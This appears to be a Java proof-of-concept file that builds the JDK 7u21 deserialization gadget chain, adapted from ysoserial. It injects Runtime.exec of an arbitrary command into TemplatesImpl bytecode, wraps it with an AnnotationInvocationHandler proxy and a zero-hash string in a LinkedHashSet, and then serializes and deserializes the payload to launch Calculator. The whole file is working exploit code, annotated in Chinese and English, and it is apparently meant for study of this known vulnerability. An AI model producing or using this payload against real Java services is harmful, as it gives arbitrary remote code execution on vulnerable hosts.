package me.lightless.JDK7u21;


import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;

import javax.xml.transform.Templates;
import java.io.*;
import java.lang.reflect.*;
import java.util.HashMap;
import java.util.LinkedHashSet;

import static com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.DESERIALIZE_TRANSLET;

class Reflections {

    public static Field getField(final Class<?> clazz, final String fieldName) throws Exception {
        Field field = clazz.getDeclaredField(fieldName);
        if (field != null)
            field.setAccessible(true);
        else if (clazz.getSuperclass() != null)
            field = getField(clazz.getSuperclass(), fieldName);
        return field;
    }

    public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception {
        final Field field = getField(obj.getClass(), fieldName);
        field.set(obj, value);
    }

    public static Constructor<?> getFirstCtor(final String name) throws Exception {
        final Constructor<?> ctor = Class.forName(name).getDeclaredConstructors()[0];
        ctor.setAccessible(true);
        return ctor;
    }
}

class ClassFiles {
    public static String classAsFile(final Class<?> clazz) {
        return classAsFile(clazz, true);
    }

    public static String classAsFile(final Class<?> clazz, boolean suffix) {
        String str;
        if (clazz.getEnclosingClass() == null) {
            str = clazz.getName().replace(".", "/");
        } else {
            str = classAsFile(clazz.getEnclosingClass(), false) + "$" + clazz.getSimpleName();
        }
        if (suffix) {
            str += ".class";
        }
        return str;
    }

    public static byte[] classAsBytes(final Class<?> clazz) {
        try {
            final byte[] buffer = new byte[1024];
            final String file = classAsFile(clazz);
            final InputStream in = ClassFiles.class.getClassLoader().getResourceAsStream(file);
            if (in == null) {
                throw new IOException("couldn't find '" + file + "'");
            }
            final ByteArrayOutputStream out = new ByteArrayOutputStream();
            int len;
            while ((len = in.read(buffer)) != -1) {
                out.write(buffer, 0, len);
            }
            return out.toByteArray();
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
    }

}

class Gadgets {
    static {
        // special case for using TemplatesImpl gadgets with a SecurityManager enabled
        System.setProperty(DESERIALIZE_TRANSLET, "true");
    }

    public static class StubTransletPayload extends AbstractTranslet implements Serializable {
        private static final long serialVersionUID = -5971610431559700674L;

        public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {}

        @Override
        public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {}
    }

    // required to make TemplatesImpl happy
    public static class Foo implements Serializable {
        private static final long serialVersionUID = 8207363842866235160L;
    }

    public static <T> T createProxy(final InvocationHandler ih, final Class<T> iface, final Class<?> ... ifaces) {
        final Class<?>[] allIfaces
                = (Class<?>[]) Array.newInstance(Class.class, ifaces.length + 1);
        allIfaces[0] = iface;
        if (ifaces.length > 0) {
            System.arraycopy(ifaces, 0, allIfaces, 1, ifaces.length);
        }
        return iface.cast(
                Proxy.newProxyInstance(Gadgets.class.getClassLoader(), allIfaces , ih));
    }

    public static TemplatesImpl createTemplatesImpl(final String command) throws Exception {
        final TemplatesImpl templates = new TemplatesImpl();

        // use template gadget class

        // 获取容器ClassPool，注入classpath
        ClassPool pool = ClassPool.getDefault();
        System.out.println("insertClassPath: " + new ClassClassPath(StubTransletPayload.class));
        pool.insertClassPath(new ClassClassPath(StubTransletPayload.class));

        // 获取已经编译好的类
        System.out.println("ClassName: " + StubTransletPayload.class.getName());
        final CtClass clazz = pool.get(StubTransletPayload.class.getName());

        // 在静态的的构造方法中插入payload
        clazz.makeClassInitializer()
                .insertAfter("java.lang.Runtime.getRuntime().exec(\""
                        + command.replaceAll("\"", "\\\"")
                        + "\");");

        // 给payload类设置一个名称
        // unique name to allow repeated execution (watch out for PermGen exhaustion)
        clazz.setName("ysoserial.Pwner" + System.nanoTime());

        // 获取该类的字节码
        final byte[] classBytes = clazz.toBytecode();

        // inject class bytes into instance
        Reflections.setFieldValue(
                templates,
                "_bytecodes",
                new byte[][] {
                        classBytes,
                        ClassFiles.classAsBytes(Foo.class)
                });

        // required to make TemplatesImpl happy
        Reflections.setFieldValue(templates, "_name", "Pwnr");
        Reflections.setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());

        // 只要触发这个方法就能执行我们注入的bytecodes
        // templates.getOutputProperties();
        return templates;
    }
}


public class exp {

    public Object buildPayload(final String command) throws Exception {
        // generate evil templates，if we trigger templates.getOutputProperties(), we can execute command
        Object templates = Gadgets.createTemplatesImpl(command);

        // magic string, zeroHashCodeStr.hashCode() == 0
        String zeroHashCodeStr = "f5a5a608";

        // build a hash map, and put our evil templates in it.
        HashMap map = new HashMap();
        map.put(zeroHashCodeStr, "foo");  // Not necessary

        // Generate proxy's handler，use `AnnotationInvocationHandler` as proxy's handler
        // When proxy is done，all call proxy.anyMethod() will be dispatch to AnnotationInvocationHandler's invoke method.
        Constructor<?> ctor = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler").getDeclaredConstructors()[0];
        ctor.setAccessible(true);
        InvocationHandler tempHandler = (InvocationHandler) ctor.newInstance(Templates.class, map);
//        Reflections.setFieldValue(tempHandler, "type", Templates.class);  // not necessary, because newInstance() already pass Templates.class to tempHandler
        Templates proxy = (Templates) Proxy.newProxyInstance(exp.class.getClassLoader(), templates.getClass().getInterfaces(), tempHandler);

        Reflections.setFieldValue(templates, "_auxClasses", null);
        Reflections.setFieldValue(templates, "_class", null);

        LinkedHashSet set = new LinkedHashSet(); // maintain order
        set.add(templates);     // save evil templates
        set.add(proxy);         // proxy

        map.put(zeroHashCodeStr, templates);

        return set;
    }

    public static void main(String[] args) throws Exception {
        exp exploit = new exp();
        Object payload = exploit.buildPayload("open -a Calculator");

        // test payload
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("payload.bin"));
        oos.writeObject(payload);
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream("payload.bin"));
        ois.readObject();
    }

}
